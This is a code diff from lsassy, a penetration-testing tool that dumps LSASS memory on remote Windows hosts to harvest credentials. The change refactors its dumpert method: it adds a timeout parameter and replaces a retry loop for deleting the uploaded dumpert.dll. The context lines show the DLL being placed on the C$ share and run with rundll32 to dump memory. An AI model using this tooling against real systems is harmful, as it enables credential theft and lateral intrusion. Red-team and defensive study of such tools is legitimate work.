@@ -1,8 +1,8 @@
 import logging
 import os
-import time
 
 from lsassy.dumpmethod.idumpmethod import IDumpMethod
+from lsassy.impacketfile import ImpacketFile
 
 
 class DumpMethod(IDumpMethod):
@@ -13,8 +13,8 @@ class DumpMethod(IDumpMethod):
     dump_share = "C$"
     dump_path = "\\Windows\\Temp\\"
 
-    def __init__(self, session):
-        super().__init__(session)
+    def __init__(self, session, timeout):
+        super().__init__(session, timeout)
         self.dumpertdll = "dumpert.dll"
         self.dumpertdll_path = False
         self.dumpertdll_remote_share = "C$"
@@ -50,18 +50,7 @@ class DumpMethod(IDumpMethod):
 
     def clean(self):
         if self.dumpertdll_uploaded:
-            t = time.time()
-            while True:
-                try:
-                    self._session.smb_session.deleteFile(self.dumpertdll_remote_share, self.dumpertdll_remote_path + self.dumpertdll)
-                    logging.debug("dumpertdll successfully deleted")
-                    return True
-                except Exception as e:
-                    if time.time() - t > 5:
-                        logging.warning("dumpertdll deletion error.")
-                        return False
-                    logging.debug("dumpertdll deletion error. Retrying...")
-                    time.sleep(0.5)
+            ImpacketFile.delete(self._session, self.dumpertdll_remote_path + self.dumpertdll, timeout=self._timeout)
 
     def get_commands(self):
         cmd_command = """rundll32.exe {}{},Dump""".format(self.dumpertdll_remote_path, self.dumpertdll)
